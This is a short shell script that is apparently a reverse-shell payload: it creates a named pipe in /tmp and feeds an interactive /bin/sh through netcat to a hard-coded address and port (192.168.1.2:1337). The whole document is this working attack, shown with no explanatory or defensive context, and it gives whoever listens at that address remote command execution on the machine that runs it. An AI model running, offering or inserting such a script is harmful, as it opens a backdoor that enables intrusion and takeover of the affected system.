#!/bin/sh

TARGET_IP="192.168.1.2"
TARGET_PORT="1337"

rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc $TARGET_IP $TARGET_PORT >/tmp/f
